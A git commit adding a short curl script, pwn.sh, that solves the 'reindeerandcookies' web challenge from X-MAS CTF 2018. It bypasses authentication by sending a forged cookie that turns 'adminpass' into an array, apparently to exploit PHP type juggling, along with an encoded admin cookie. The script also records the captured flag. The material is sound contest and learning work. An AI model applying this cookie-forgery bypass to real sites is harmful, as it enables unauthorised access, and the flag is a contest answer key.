a31a67d68e3265b1ee7693ee944a6ba21c86ac4b
Aaditya Purani <aaditya.purani@gmail.com>
2018-12-23 08:53:12 +0530

    Create pwn.sh

---
+++ xmasctf-2018/web/reindeerandcookies/pwn.sh
@@ -0,0 +1,6 @@
+curl -i -s -k  -X $'GET' \
+    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36' -H $'Upgrade-Insecure-Requests: 1' \
+    -b $'adminpass[]=MyLittleCookie%21; cookiez=WlhsS2NGcERTVFpKYWtWcFRFTktNR1ZZUW14SmFtOXBXVmRTZEdGWE5HbG1VVDA5' \
+    $'http://199.247.6.180:12008/'
+    
+#X-MAS{S4n74_L0v35__C00kiesss_And_Juggl1ng!}
